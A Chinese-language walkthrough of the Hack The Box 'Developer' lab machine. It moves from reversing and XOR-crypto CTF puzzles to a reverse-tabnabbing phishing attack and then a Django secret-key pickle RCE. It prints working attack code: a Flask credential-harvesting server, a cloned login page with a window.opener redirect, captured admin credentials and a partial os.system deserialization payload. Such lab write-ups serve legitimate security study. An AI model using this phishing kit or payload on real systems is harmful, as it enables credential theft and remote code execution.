10.10.11.103\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 18.70 seconds\n```\n\n访问 `HTTP`\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Developer/image1.png)\n\n可以创建账户，注册一个用户 `sunset` ，创建完毕后会直接进入后台\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Developer/image2.png)\n\n里面会有一些CTF题？让你做？\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Developer/image3.png)\n\n## CTF\n\n### PES\n\n 题目会给出一个`EXE`文件合一串加密后的字符串：`X/o8VJQE1pyQhjmpcwk45+L069bivpF63PjZP4z7ahKaC+jv89NT6ze0T5id0lWC`\n\n对程序进行反编译，在`PS2EXE`中的`Main`中能找到一串`base64`编码后的字符串\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Developer/image4.png)\n\n解码后是加密的逻辑，通过`AI`写出解密脚本即可\n\n```bash\n# ===================================================================\n# Decryption Script for FullCrypto\n# We are reversing the logic from the original Encrypt-String function\n# ===================================================================\n\n# 加载必要的程序集\n[void] [System.Reflection.Assembly]::LoadWithPartialName(\"System.Security\")\nAdd-Type -AssemblyName System.Security\n\nfunction Decrypt-String($base64String) {\n    # --- 这些是我们在原脚本中找到的硬编码秘密 ---\n    $Passphrase = \"AmazinglyStrongPassword\"\n    $salt       = \"CrazilySimpleSalt\"\n    $init       = \"StupidlyEasy_IV\"\n    # ----------------------------------------------\n\n    # 1. 准备 Rijndael (AES) 对象\n    $r = New-Object System.Security.Cryptography.RijndaelManaged\n\n    # 2. 准备密码和盐值的字节数组 (必须和加密时完全一样)\n    $passBytes = [System.Text.Encoding]::UTF8.GetBytes($Passphrase)\n    $saltBytes = [System.Text.Encoding]::UTF8.GetBytes($salt)\n\n    # 3. 生成密钥 (必须和加密时完全一样)\n    # 使用 PasswordDeriveBytes, SHA1, 5次迭代, 生成32字节密钥\n    $r.Key = (New-Object System.Security.Cryptography.PasswordDeriveBytes $passBytes, $saltBytes, \"SHA1\", 5).GetBytes(32)\n\n    # 4. 生成 IV (必须和加密时完全一样)\n    # 计算 IV 种子的 SHA1 哈希，并取前16个字节\n    $r.IV = (New-Object System.Security.Cryptography.SHA1Managed).ComputeHash([System.Text.Encoding]::UTF8.GetBytes($init))[0..15]\n\n    # 5. 从 Base64 字符串解码出加密后的字节数组\n    try {\n        $encryptedBytes = [System.Convert]::FromBase64String($base64String)\n    } catch {\n        Write-Error \"Invalid Base64 string. Cannot decrypt.\"\n        return\n    }\n\n    # 6. 创建解密器并执行解密\n    $c = $r.CreateDecryptor()\n    $ms = New-Object System.IO.MemoryStream @(,$encryptedBytes)\n    $cs = New-Object System.Security.Cryptography.CryptoStream $ms, $c, \"Read\"\n    $sr = New-Object System.IO.StreamReader $cs\n\n    # 7. 读取解密后的明文\n    $decryptedString = $sr.ReadToEnd()\n\n    # 8. 清理资源并返回结果\n    $sr.Close()\n    $cs.Close()\n    $ms.Close()\n    $r.Clear()\n\n    return $decryptedString\n}\n\n# --- 使用方法 ---\n# 将你在挑战中得到的加密字符串替换到下面的变量中\n$encryptedData = \"这里放你要解密的Base64字符串\"\n\n# 调用解密函数\n$decryptedResult = Decrypt-String -base64String $encryptedData\n\n# 输出解密结果\nWrite-Host \"Decryption Result:\" -ForegroundColor Green\nWrite-Host $decryptedResult\n\n```\n\n```bash\nPS D:\\System\\Downloads\\20250620> .\\pass.ps1\nDecryption Result:\nDHTB{P0w3rsh3lL_F0r3n51c_M4dn3s5}\n```\n\n### Phished List\n\n给一个`xlsx`文件，听说文档中包含密码\n\n像是隐写题，上网搜索了下，`docs`和`xlsx`基本上就是`zip`文件，我们对其进行解压\n\n然后找到 `phished_credentials\\xl\\worksheets\\sheet1.xml` ,在最底下能找到\n\n```bash\n<sheetProtection \nalgorithmName=\"SHA-512\" \nhashValue=\"Y4Ko7kZUKStIxaVGWEtuMeRdnCiN7O3D8qZtKdo/2jP7WE6yzKQXUcSWQ/E0OrqHCzhOBFX+t8Db5Pxaiu+N1g==\" \nsaltValue=\"EoiHQklf0FagPs+iW0OzkA==\" \nspinCount=\"100000\" \nsheet=\"1\" \nobjects=\"1\" \nscenarios=\"1\"/>\n```\n\n我们将 `sheet1.xml` 的`sheetProtection` 块删掉后，再放进去替换掉原本的 `sheet1.xml` 即可\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Developer/image5.png)\n\n```bash\nDHTB{H1dD3N_C0LuMn5_FtW}\n```\n\n### Lucky Guess\n\n压缩包解压后是一个程序，我们直接`IDA`打开\n\n`winner`函数\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Developer/image6.png)\n\n`AI`编写异或脚本\n\n```bash\n# C 代码中的变量\nkey = \"98hKjr3f8CgfF\"\nciphertext = \"^w!%-%z2p7/# uw?\"\n\n# 用于存放解密结果的变量\nplaintext = \"\"\n\n# 遍历密文中的每一个字符\nfor i in range(len(ciphertext)):\n    # 1. 取出密文字符和对应的密钥字符\n    #    使用模运算 (%) 来实现密钥的循环使用\n    cipher_char = ciphertext[i]\n    key_char = key[i % len(key)]\n    \n    # 2. 进行异或 (XOR) 运算\n    #    ord() 获取字符的ASCII码，^ 是异或操作符\n    decrypted_char_code = ord(cipher_char) ^ ord(key_char)\n    \n    # 3. 应用特殊处理规则\n    if decrypted_char_code <= 31:\n        decrypted_char_code += 32\n        \n    # 4. 将解密后的ASCII码转换回字符，并拼接到结果字符串中\n    #    chr() 将ASCII码转为字符\n    plaintext += chr(decrypted_char_code)\n\n# 按照格式输出最终的 Flag\nflag = f\"DHTB{{{plaintext}}}\"\nprint(flag)\n```\n\n```bash\n➜  Developer python getpass.py                                              \nDHTB{gOInGWITHtHEfLOW}\n```\n\n### Authenication\n\nI developed a new authentication mechanism using rust. Can you reverse my password?\n\n`rust` 逆向\n\n```bash\n➜  Developer ./authenticate                                    \nWelcome to TheCyberGeek's authentication platform\nEnter the password to proceed: \nsdadad\nYou are unauthorized to use this application!\n➜  Developer file authenticate \nauthenticate: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=95ac617025cf1bfe1e6749172a7888dfc4fe4dfe, for GNU/Linux 3.2.0, with debug_info, not stripped\n```\n\n进去要你输入密码然后验证，`IDA`打开，找到验证的部分\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Developer/image7.png)\n\n其中的这行代码正在执行 `v3 == v5` 的比较，并把结果（`true` 或 `false`）存起来\n\n```bash\nHIBYTE(v2.pieces.data_ptr) = core::cmp::impls::_$LT$impl$u20$core..cmp..PartialEq$LT$$RF$B$GT$$u20$for$u20$$RF$A$GT$::eq::h372d5aaf05c06316(\n                                 &v3,\n                                 &v5);\n```\n\n其中一个应该是用户输入的，然后和`v3` 或者 `v5` 去比较，所以我们要在`v3`或者`v5` 处断点，就可以看到是和什么在对比\n\n```bash\n➜  Developer pwndbg authenticate \nReading symbols from authenticate...\npwndbg: loaded 190 pwndbg commands. Type pwndbg [filter] for a list.\npwndbg: created 13 GDB functions (can be used with print/break). Type help function to see them.\n------- tip of the day (disable with set show-tips off) -------\nIf you want Pwndbg to clear screen on each command (but still save previous output in history) use set context-clear-screen on\npwndbg> info functions\n...\n0x0000000000008e30  main::validate\n0x00000000000090f0  main::authenticated                                                                           \n0x0000000000009130  main::check_password                                                                          \n0x0000000000009240  main::main                 \n0x0000000000009360  main   \n...\npwndbg> disassemble 0x0000000000009130\n...\n   0x00000000000091af <+127>:   mov    rcx,QWORD PTR [rsp+0x10]                                                   \n   0x00000000000091b4 <+132>:   mov    QWORD PTR [rsp+0x60],rcx                                                   \n   0x00000000000091b9 <+137>:   lea    rdi,[rsp+0x38]\n   0x00000000000091be <+142>:   lea    rsi,[rsp+0x58]\n   0x00000000000091c3 <+147>:   call   0x7a80 <_ZN4core3cmp5impls69_$LT$impl$u20$core..cmp..PartialEq$LT$$RF$B$GT$$u20$for$u20$$RF$A$GT$2eq17h372d5aaf05c06316E>\n   0x00000000000091c8 <+152>:   mov    BYTE PTR [rsp+0x7],al                                                      \n   0x00000000000091cc <+156>:   jmp    0x91ce <_ZN4main14check_password17h1ae7b2b87f21bd0aE+158>                  \n   0x00000000000091ce <+158>:   lea    rdi,[rsp+0x40]  \n   0x00000000000091d3 <+163>:   call   0x9db0 <_ZN4core3ptr13drop_in_place17h5e2052686c20525eE>                   \n   0x00000000000091d8 <+168>:   mov    al,BYTE PTR [rsp+0x7]                                                      \n   0x00000000000091dc <+172>:   test   al,0x1 \n...\n```\n\n`0x00000000000091c3` 是我们想要断点的地方，但是可能有`ALSR` ，我们不能直接断点\n\n```bash\npwndbg> b main\nBreakpoint 1 at 0x9360\npwndbg> r\n────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────────────────────────────────────────────────────────────────────────────────\n ► 0x55555555d360 <main>                                                                                          push   rax\n   0x55555555d361 <main+1>                                                                                        movsxd rax, edi                 RAX => 1\n   0x55555555d364 <main+4>                                                                                        lea    rdi, [rip - 0x12b]       RDI => 0x55555555d240 (main::main) ◂— sub rsp, 0xb8\n   0x55555555d36b <main+11>                                                                                       mov    qword ptr [rsp], rsi     [0x7fffffffdf40] <= 0x7fffffffe058 —▸ 0x7fffffffe35d ◂— '/root/Desktop/HackTheBox/Developer/authenticate'\n   0x55555555d36f <main+15>                                                                                       mov    rsi, rax                 RSI => 1\n   0x55555555d372 <main+18>                                                                                       mov    rdx, qword ptr [rsp]     RDX, [0x7fffffffdf40] => 0x7fffffffe058 —▸ 0x7fffffffe35d ◂— '/root/Desktop/HackTheBox/Developer/authenticate'\n   0x55555555d376 <main+22>                                                                                       call   std::rt::lang_start         <std::rt::lang_start>\n \n   0x55555555d37b <main+27>                                                                                       pop    rcx\n   0x55555555d37c <main+28>                                                                                       ret    \n \n   0x55555555d37d                                                                                                 nop    dword ptr [rax]\n   0x55555555d380 <<alloc::vec::Vec<T> as alloc::vec::SpecExtend<&T,core::slice::iter::Iter<T>>>::spec_extend>    sub    rsp, 0x28\n```\n\n能看到地址都变成了`0x55555555dxxx`\n\n```bash\n0x555555554000 + 0x91c3 = 0x55555555d1c3\n```\n\n然后再在`0x55555555d1c3`处断点\n\n```bash\npwndbg> b *0x55555555d1c3\nBreakpoint 2 at 0x55555555d1c3\npwndbg> c\nContinuing.\nWelcome to TheCyberGeek's authentication platform\nEnter the password to proceed: \nwhat（随便输入）\n```\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Developer/image8.png)\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Developer/image9.png)\n\n可以看到 `what`是和`DHTB{rusty_bu5in3s5}` 在比较\n\n```bash\n➜  Developer ./authenticate\nWelcome to TheCyberGeek's authentication platform\nEnter the password to proceed: \nDHTB{rusty_bu5in3s5}\nYou have successfully authenticated!\n```\n\n```bash\nDHTB{rusty_bu5in3s5}\n```\n\n### RevMe\n\n直接就能拿到 `flag`\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Developer/image10.png)\n\n```bash\nDHTB{TCG5_S1mPl3_R3v3r51nG_Ch4773nG3}\n```\n\n### PwnMe\n\n`PWN`题目，checksec，`NX`和`PIE`都开了\n\n```bash\n➜  Developer checksec pwnme  \n[*] Checking for new versions of pwntools\n    To disable this functionality, set the contents of /root/.cache/.pwntools-cache-3.13/update to 'never' (old way).\n    Or add the following lines to ~/.pwn.conf or ~/.config/pwn.conf (or /etc/pwn.conf system-wide):\n        [update]\n        interval=never\n[*] You have the latest version of Pwntools (4.14.1)\n[*] '/root/Desktop/HackTheBox/Developer/pwnme'\n    Arch:       amd64-64-little\n    RELRO:      Partial RELRO\n    Stack:      No canary found\n    NX:         NX enabled\n    PIE:        PIE enabled\n    Stripped:   No\n```\n\n但是貌似并不用看这个，也像是逆向题目，下边是`main`函数\n\n```bash\nint __fastcall main(int argc, const char **argv, const char **envp)\n{\n  char *v3; // rax\n  char s[8]; // [rsp+10h] [rbp-20h] BYREF\n  __int64 v6; // [rsp+18h] [rbp-18h]\n  int v7; // [rsp+20h] [rbp-10h]\n  char *v8; // [rsp+28h] [rbp-8h]\n\n  if ( argc > 1 )\n  {\n    if ( (unsigned int)check_password(argv[1], argv, envp) )\n    {\n      puts(\"Password correct. Here's a flag:\");\n      *(_QWORD *)s = 0xC384B2CB92A49894LL;\n      v6 = 0x8796C283C680B381LL;\n      v7 = 13486015;\n      v8 = s;\n      while ( *v8 )\n      {\n        v3 = v8++;\n        *v3 -= 80;\n      }\n      puts(s);\n    }\n    else\n    {\n      puts(\"Wrong password.\");\n    }\n  }\n  else\n  {\n    puts(\"Please enter your password as a program argument!\");\n  }\n  return 0;\n}\n```\n\n主要及时要看`check_password`\n\n```bash\n__int64 __fastcall check_password(const char *a1)\n{\n  char *v1; // rax\n  char v3[8]; // [rsp+13h] [rbp-3Dh] BYREF\n  char s2[16]; // [rsp+20h] [rbp-30h] BYREF\n  char dest[16]; // [rsp+30h] [rbp-20h] BYREF\n  char *v6; // [rsp+40h] [rbp-10h]\n  unsigned int v7; // [rsp+4Ch] [rbp-4h]\n\n  v7 = 0;\n  strcpy(v3, \"门赖旅惫杀緝\");\n  v6 = v3;\n  while ( *v6 )\n  {\n    v1 = v6++;\n    *v1 -= 80;\n  }\n  strcpy(dest, a1);\n  strcpy(s2, v3);\n  if ( !strcmp(dest, s2) )\n    return 1;\n  return v7;\n}\n```\n\n`a1`是我们的键入的参数，主要的解密逻辑是在：\n\n```bash\n  while ( *v6 )\n  {\n    v1 = v6++;\n    *v1 -= 80;\n  }\n```\n\n程序遍历这个神秘字符串（`v3`）的每一个字节，并将每个字节的值减去 `80`\n\n但是最后还是会在`if ( !strcmp(dest, s2) )` 处进行对比，我们还是在那断点，查看一下寄存器的值\n\n我们要在`0x00000000000011de` 处断点\n\n```bash\n0x00000000000011d8 <+131>:   mov    rsi,rdx\n0x00000000000011db <+134>:   mov    rdi,rax\n0x00000000000011de <+137>:   call   0x1050 <strcmp@plt>\n0x00000000000011e3 <+142>:   test   eax,eax\n```\n\n和之前一样，因为有`ALSR`，所以我们要在`main`处断点\n\n```bash\n ► 0x5555555551f7 <main+4>      sub    rsp, 0x30                       RSP => 0x7fffffffdf30 (0x7fffffffdf60 - 0x30)\n   0x5555555551fb <main+8>      mov    dword ptr [rbp - 0x24], edi     [0x7fffffffdf3c] <= 1\n   0x5555555551fe <main+11>     mov    qword ptr [rbp - 0x30], rsi     [0x7fffffffdf30] <= 0x7fffffffe078 —▸ 0x7fffffffe372 ◂— '/root/Desktop/HackTheBox/Developer/pwnme'\n   0x555555555202 <main+15>     cmp    dword ptr [rbp - 0x24], 1       1 - 1     EFLAGS => 0x246 [ cf PF af ZF sf IF df of ac ]\n   0x555555555206 <main+19>   ✘ jg     main+38                     <main+38>\n \n   0x555555555208 <main+21>     lea    rdi, [rip + 0xdf9]              RDI => 0x555555556008 ◂— 'Please enter your password as a program argument!'\n   0x55555555520f <main+28>     call   puts@plt                    <puts@plt>\n \n   0x555555555214 <main+33>     jmp    main+175                    <main+175>\n    ↓\n   0x5555555552a2 <main+175>    mov    eax, 0     EAX => 0\n   0x5555555552a7 <main+180>    leave  \n   0x5555555552a8 <main+181>    ret    \n```\n\n```bash\npwndbg> b *0x5555555551de\nBreakpoint 2 at 0x5555555551de\npwndbg> c                                  \nContinuing.                                                                                                       \n                                                                                                                  \nBreakpoint 2, 0x00005555555551de in check_password ()                                                             \nLEGEND: STACK | HEAP | CODE | DATA | WX | RODATA \n───────────────────────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────────────────────────────────────────────────────────────────────\n*RAX  0x7fffffffdef0 ◂— 0x9700333231 /* '123' */                                                                  \n RBX  0x7fffffffe068 —▸ 0x7fffffffe36e ◂— '/root/Desktop/HackTheBox/Developer/pwnme'\n*RCX  0x336e6179696173                                                                                                                                                                                                              \n*RDX  0x7fffffffdee0 ◂— 'supersaiyan3'  \n*RDI  0x7fffffffdef0 ◂— 0x9700333231 /* '123' */\n*RSI  0x7fffffffdee0 ◂— 'supersaiyan3'\n```\n\n我们能看到寄存器上的值是`supersaiyan3`\n\n```bash\n➜  Developer ./pwnme supersaiyan3           \nPassword correct. Here's a flag:\nDHTB{b4s1c0v3rF7ow}\n```\n\n### Esay Encryption\n\n需要解密`DRwdFjIMJiYgOi4dOhI8OjQ=`\n\n下载会给出一个异或脚本\n\n```bash\n#!/usr/bin/python3\nfrom itertools import izip, cycle\nimport base64\n\ndef xor_crypt_string(data, key='**'):\n    xored = ''.join(chr(ord(x) ^ ord(y)) for (x,y) in izip(data, cycle(key)))\n    return base64.encodestring(xored).strip()\n\nsecret_data = \"<REDACTED>\"\nprint xor_crypt_string(secret_data)\n```\n\n但是我们不知道`key`是什么，但是我们能知道前五位是 `DHTB{`\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Developer/image11.png)\n\n我们反过来即可得到`flag`\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Developer/image12.png)\n\n### Triple Whammy\n\nWe've been told these keys hold a secret message, can you decode it?\n\n```bash\nc249e41fc6ee70a6c72d0441360cd7714f56b95f08edfce23e\nfb9c2b4b0b07422617884a2ac6e4ea4cbf72563bd55b33894b\n7d9d9b16b6b15df288ca3c339f9a7b489e629a0a9bc3a1167f\n```\n\n解压后得到的脚本\n\n```bash\nimport os\nfrom secret import flag\n\ndef bxor(ba1, ba2):\n    return bytes([_a ^ _b for _a, _b in zip(ba1, ba2)])\n\nkey1 = os.urandom(len(flag))\nkey2 = os.urandom(len(flag))\n\nct1 = bxor(key1, flag)\nct2 = bxor(ct1, key2)\nct3 = bxor(key2, flag)\n\nprint(ct1.hex())\nprint(ct2.hex())\nprint(ct3.hex())\n```\n\n`AI`一把梭哈\n\n```bash\n#!/usr/bin/python3\n\ndef bxor(ba1, ba2):\n    \"\"\"Performs a byte-wise XOR operation on two byte strings.\"\"\"\n    return bytes([_a ^ _b for _a, _b in zip(ba1, ba2)])\n\n# 1. 从题目中获取的三个十六进制密文\nhex_ct1 = \"c249e41fc6ee70a6c72d0441360cd7714f56b95f08edfce23e\"\nhex_ct2 = \"fb9c2b4b0b07422617884a2ac6e4ea4cbf72563bd55b33894b\"\nhex_ct3 = \"7d9d9b16b6b15df288ca3c339f9a7b489e629a0a9bc3a1167f\"\n\n# 2. 将十六进制字符串转换为字节（bytes）对象\nct1 = bytes.fromhex(hex_ct1)\nct2 = bytes.fromhex(hex_ct2)\nct3 = bytes.fromhex(hex_ct3)\n\n# 3. 根据推导，将三个密文全部异或\n# flag = ct1 ^ ct2 ^ ct3\n# 我们可以分两步来完成\ntemp_xor_result = bxor(ct1, ct2)\nflag_bytes = bxor(temp_xor_result, ct3)\n\n# 4. 将恢复的字节数据解码为UTF-8字符串并打印\ntry:\n    flag = flag_bytes.decode('utf-8')\n    print(\"🎉 Flag has been successfully recovered!\")\n    print(f\"[*] Flag: {flag}\")\nexcept UnicodeDecodeError:\n    print(\"❌ Could not decode the result as a UTF-8 string.\")\n    print(f\"[*] Raw bytes (hex): {flag_bytes.hex()}\")\n```\n\n```bash\n🎉 Flag has been successfully recovered!\n[*] Flag: DHTB{XorXorXorFunFunFun}\n```\n\n## 钓鱼攻击\n\n其实做完一道题就可以继续打了\n\n做完后有一个提交`writeup`的输入框\n\n我们开启`Web`服务器，并提交改地址上去，看是否有人会访问\n\n不一会就有回显了\n\n```bash\n➜  Developer python -m http.server 80\nServing HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...\n10.10.11.103 - - [21/Jun/2025 18:53:48] \"GET / HTTP/1.1\" 200 -\n10.10.11.103 - - [21/Jun/2025 18:53:49] code 404, message File not found\n10.10.11.103 - - [21/Jun/2025 18:53:49] \"GET /favicon.ico HTTP/1.1\" 404 -\n```\n\n但是我们还不知道要如何进行利用\n\n`Sessionid`开启了`httponly` ，我们无法通过`XSS`获取\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Developer/image13.png)\n\n通过目录扫描能发现，还存在一个登录框，并且是只能`admin`才能访问\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Developer/image14.png)\n\n但是现在没什么用，回到后台，我发现当我们提交了`writeup`后，会在`profile`中生成一个链接\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Developer/image15.png)\n\n重要的是这个链接具有`target`属性，其值为`_blank`,同时没有使用`rel=\"noopener\"`属性，这让我想起`Reverse_Tabnabbing` （标签页劫持攻击）漏洞，之前有在`Vulnhub`上的一台靶机（https://www.vulnhub.com/entry/napping-101,752/）遇到过\n\n### Reverse_Tabnabbing\n\n> https://owasp.org/www-community/attacks/Reverse_Tabnabbing\n> \n\n监听一下对方请求\n\n```bash\n➜  Developer nc -lvp 80    \nlistening on [any] 80 ...\nconnect to [10.10.16.58] from developer.htb [10.10.11.103] 47222\nGET / HTTP/1.1\nHost: 10.10.16.58\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nConnection: keep-alive\nUpgrade-Insecure-Requests: 1\nIf-Modified-Since: Sat, 21 Jun 2025 11:08:45 GMT\n```\n\n回显中有`firefox`的`UA`，很大概率使用浏览器来访问的\n\n现在的思路是：提交跳转链接，然后伪造一个和`developer.htb` 的登录页面一样站点，对方点击后，弹到`writeup`页面，然后原始页面（`dashbroad`）变成我们的钓鱼网站，让对方以为登录掉了，然后我们获取凭证\n\n这里借用：https://0xdf.gitlab.io/2022/01/15/htb-developer.html#shell-as-www-data 的方法，我自己弄了好久没弄好\n\n搭建钓鱼服务器\n\n```bash\n➜  Developer cat server2.py  \nfrom flask import *\n\napp = Flask(__name__, template_folder='.')\n\n@app.route(\"/writeup\")\ndef writeup():\n    return render_template('writeup.html')\n\n@app.route(\"/accounts/login/\", methods=['GET', 'POST'])\ndef login():\n\n    if request.method == 'POST':\n        print('\\n'.join([f'{x[0]}: {x[1]}' for x in request.form.items()]))\n        return redirect(\"http://10.10.10.120/accounts/login/\", code=302)\n    else:\n        return render_template('login.html')\n\nif __name__ == \"__main__\":\n    app.run(host=\"0.0.0.0\", port=80)\n```\n\n跳转网站\n\n```bash\n<html>\n  <body>\n    <h2>Challenge Writeup</h2>\n    <p>Something</p>\n    <script>\n    if (window.opener) window.opener.parent.location.replace('http://10.10.16.58/accounts/login/');\n    if (window.parent != window) window.parent.location.replace('https://10.10.16.58/accounts/login/');           \n    </script>\n  </body>\n</html>\n```\n\n制造钓鱼站点\n\n```bash\n➜  Developer curl http://developer.htb/accounts/login/ > login.html                                                \n  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                 Dload  Upload   Total   Spent    Left  Speed\n100  1938  100  1938    0     0  13686      0 --:--:-- --:--:-- --:--:-- 13744\n```\n\n修改里面的静态内容为绝对路径并将`action` 改为`/accounts/login/`\n\n```bash\n<!doctype html>\n<html lang=\"en\">\n  <head>\n    <meta charset=\"utf-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1, shrink-to-fit=no\">\n    <meta name=\"description\" content=\"\">\n    <meta name=\"author\" content=\"\">\n    <link rel=\"icon\" href=\"http://developer.htb/img/favicon.ico\">\n    <link rel=\"stylesheet\" href=\"http://developer.htb/static/css/jquery.toasts.css\">\n    <script src=\"http://developer.htb/static/js/all.min.js\"></script>\n    <script src=\"http://developer.htb/static/js/jquery-3.2.1.min.js\"></script>\n    <title>Login | Developer.HTB</title>\n\n    <!-- Bootstrap core CSS -->\n    <link rel=\"stylesheet\" href=\"http://developer.htb/static/css/bootstrap.min.css\">\n\n    <!-- Custom styles for this template -->\n    <link href=\"http://developer.htb/static/css/signin.css\" rel=\"stylesheet\">\n  </head>\n\n  <body class=\"text-center\">\n\n    <form class=\"form-signin\" action=\"/accounts/login/\" method=\"post\">\n        <input type=\"hidden\" name=\"csrfmiddlewaretoken\" value=\"3W4vCYZiDT8dEraVzrXiGZWKWIOnF1L89n59maXHD5msDXNkDs2N5ZV6TmEIQqFE\">\n      <img class=\"mb-4\" src=\"http://developer.htb/static/img/logo.png\" alt=\"\" width=\"72\" height=\"72\">\n      <h1 class=\"h3 mb-3 font-weight-normal\">Welcome back!</h1>\n      <label for=\"uname\" class=\"sr-only\">User Name</label>\n      <input type=\"text\" id=\"id_login\" name=\"login\" placeholder=\"Username\" class=\"form-control\" required autofocus>\n      <label for=\"password\" class=\"sr-only\">Password</label>\n      <input type=\"password\" id=\"id_password\" name=\"password\" placeholder=\"Password\" class=\"form-control\" required>\n\n      <button id=\"loginbtn\" class=\"btn btn-lg btn-primary btn-block\" type=\"submit\">Sign in</button>\n          <a href=\"http://developer.htb/saccounts/password/reset/\" class=\"auth-link\">Forgot password?</a>\n                <div class=\"text-center mt-4 font-weight-light\"> Don't have an account? <a href=\"http://developer.htb/saccounts/signup/\" >Click here!</a>\n      <p class=\"mt-5 mb-3 text-muted\">&copy; Developer.HTB 2021</p>\n    </form>\n\n<script src=\"http://developer.htb/static/js/jquery.toast.js\"></script>\n<script>\n\n</script>\n  </body>\n</html>\n```\n\n开启钓鱼服务器，并提交`/writeup`到站点中，过一会就能接收到用户的密码了\n\n```bash\n➜  Developer python server2.py\n * Serving Flask app 'server2'\n * Debug mode: off\nWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.\n * Running on all addresses (0.0.0.0)\n * Running on http://127.0.0.1:80\n * Running on http://192.168.111.155:80\nPress CTRL+C to quit\n10.10.11.103 - - [21/Jun/2025 20:49:24] \"GET /writeup HTTP/1.1\" 200 -\n10.10.11.103 - - [21/Jun/2025 20:49:24] \"GET /accounts/login/ HTTP/1.1\" 200 -\ncsrfmiddlewaretoken: 3W4vCYZiDT8dEraVzrXiGZWKWIOnF1L89n59maXHD5msDXNkDs2N5ZV6TmEIQqFE\nlogin: admin\npassword: SuperSecurePassword@HTB2021\n10.10.11.103 - - [21/Jun/2025 20:49:25] \"POST /accounts/login/ HTTP/1.1\" 302 -\n10.10.11.103 - - [21/Jun/2025 20:49:28] \"GET /accounts/login/ HTTP/1.1\" 200 -\n```\n\n这里很奇怪的就是，我自己复现该漏洞无法复现成功\n\n## Django Secret Key & RCE\n\n拥有管理员凭据后，我们就能对 `/admin`进行登陆了\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Developer/image16.png)\n\n能发现一个新的子域名\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Developer/image17.png)\n\n搭建的是`sentry` 一款开源的实时异常监控平台\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Developer/image18.png)\n\n注册账号登录进去，无法使用上面的凭据\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Developer/image19.png)\n\n版本 `Sentry 8.0.0` 在网上能找到它的反序列化漏洞的利用脚本，但是并没有将`shell`弹回来\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Developer/image20.png)\n\n这里使用 `jacob@developer.htb` （可以从`Member`里得到）的凭据和上边钓鱼得到的密码成功获得`sentry`更高权限\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Developer/image21.png)\n\n然后摸索一番后，我创建了新的`project`然后删除，但是删除的时候出现了错误\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Developer/image22.png)\n\n还有很多的调试信息\n\n```bash\nSENTRY_OPTIONS \t\n\n{'cache.backend': 'sentry.cache.redis.RedisCache',\n 'cache.options': {},\n 'redis.options': {'hosts': {0: {'host': '127.0.0.1',\n                                 'password': 'g7dRAO6BjTXMtP3iXGJjrSkz2H9Zhm0CAp2BnXE8h92AOWsPZ2zvtAapzrP8sqPR92aWN9DA207XmUTe',\n                                 'port': 6379}}},\n 'system.databases': {'default': {'ATOMIC_REQUESTS': False,\n                                  'AUTOCOMMIT': True,\n                                  'CONN_MAX_AGE': 0,\n                                  'ENGINE': 'sentry.db.postgres',\n                                  'HOST': 'localhost',\n                                  'NAME': 'sentry',\n                                  'OPTIONS': {},\n                                  'PASSWORD': u'********************',\n                                  'PORT': '',\n                                  'TEST_CHARSET': None,\n                                  'TEST_COLLATION': None,\n                                  'TEST_MIRROR': None,\n                                  'TEST_NAME': None,\n                                  'TIME_ZONE': 'UTC',\n                                  'USER': 'sentry'}},\n 'system.debug': True,\n 'system.secret-key': 'c7f3a64aa184b7cbb1a7cbe9cd544913'}\n```\n\n可以看到内部装了`redis` ，并且密码也出来了，下边还有个有趣的`secret-key`\n\n经过一番搜索，`secret-key` 会导致反序列化的`RCE`漏洞\n\n其中有一篇文章：https://blog.scrt.ch/2018/08/24/remote-code-execution-on-a-facebook-server/\n\n里边有一个`POC` ，会让系统睡`30`秒\n\n```bash\n#!/usr/bin/python\nimport django.core.signing, django.contrib.sessions.serializers\nfrom django.http import HttpResponse\nimport cPickle\nimport os\n\nSECRET_KEY='c7f3a64aa184b7cbb1a7cbe9cd544913'\n#Initial cookie I had on sentry when trying to reset a password\ncookie='.eJxrYKotZNQI5UxMLsksS80vSi9kimBjYGAoTs0rKaosZA5lKS5NyY_gAQplR7lVRJYEmrkUFqZFcAEFSlKLS5Lz87MzU8FayvOLslNTQnnjE0tLMuJLi1OL4jNTvFlDhZAEkhKTs1PzUkKVIObrlZZk5hTrgeT1XHMTM3McgSwniJpSPQABCTQf:1uSyim:otT7eddw7eu0o_QNAt1QRz6f1m8'\nnewContent =  django.core.signing.loads(cookie,key=SECRET_KEY,serializer=django.contrib.sessions.serializers.PickleSerializer,salt='django.contrib.sessions.backends.signed_cookies')\nclass PickleRce(object):\n    def __reduce__(self):\n        return (os.system,(\"sleep 